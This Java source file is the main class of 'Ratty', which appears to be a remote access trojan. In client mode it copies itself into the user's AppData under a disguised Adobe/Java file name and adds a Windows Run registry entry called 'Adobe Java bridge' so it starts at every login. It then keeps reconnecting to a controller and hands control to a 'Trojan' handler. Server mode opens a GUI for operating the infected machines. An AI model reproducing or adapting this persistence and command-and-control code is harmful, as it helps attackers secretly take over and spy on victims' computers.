package de.sogomn.rat;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

import javax.swing.JOptionPane;

import com.alee.laf.WebLookAndFeel;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.gui.RattyGui;
import de.sogomn.rat.server.gui.RattyGuiController;


public final class Ratty {
	
	private static String address;
	private static int port;
	private static boolean client;
	
	private static final int CONNECTION_INTERVAL = 2500;
	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
	
	private static final String STARTUP_FOLDER_NAME = "Adobe" + File.separator + "AIR";
	private static final String STARTUP_FILE_NAME = "jre13v3bridge.jar";
	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + STARTUP_FOLDER_NAME + File.separator + STARTUP_FILE_NAME;
	private static final String REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
	
	public static final String VERSION = "1.0";
	
	private Ratty() {
		//...
	}
	
	private static void readConnectionData() {
		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
		
		if (lines.length >= 3) {
			final String addressString = lines[0];
			final String portString = lines[1];
			final String clientString = lines[2];
			
			address = addressString;
			port = Integer.parseInt(portString);
			client = Boolean.parseBoolean(clientString);
		}
	}
	
	private static void addToStartup() {
		try {
			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
			final File source = new File(sourceUri);
			final File destination = new File(STARTUP_FILE_PATH);
			
			FileUtils.createFile(STARTUP_FILE_PATH);
			FileUtils.copy(source, destination);
			Runtime.getRuntime().exec(REGISTRY_COMMAND);
		} catch (final URISyntaxException | IOException ex) {
			ex.printStackTrace();
		}
	}
	
	public static void connectToHost(final String address, final int port) {
		final ActiveClient newClient = new ActiveClient(address, port);
		final Trojan trojan = new Trojan();
		
		if (!newClient.isOpen()) {
			try {
				Thread.sleep(CONNECTION_INTERVAL);
			} catch (final InterruptedException ex) {
				//...
			} finally {
				System.gc();
				connectToHost(address, port);
			}
			
			return;
		}
		
		newClient.setObserver(trojan);
		newClient.start();
	}
	
	public static void startServer(final int port) {
		final ActiveServer server = new ActiveServer(port);
		final RattyGui gui = new RattyGui();
		final RattyGuiController controller = new RattyGuiController(gui);
		
		server.setObserver(controller);
		server.start();
	}
	
	public static void main(final String[] args) {
		WebLookAndFeel.install();
		readConnectionData();
		
		if (client) {
			addToStartup();
			connectToHost(address, port);
		} else {
			final String[] options = {"Server", "Client"};
			final int input = JOptionPane.showOptionDialog(null, "Server or client?", null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
			
			if (input == JOptionPane.YES_OPTION) {
				System.out.println("Server");
				
				startServer(port);
			} else if (input == JOptionPane.NO_OPTION) {
				connectToHost(address, port);
			}
		}
	}
	
}
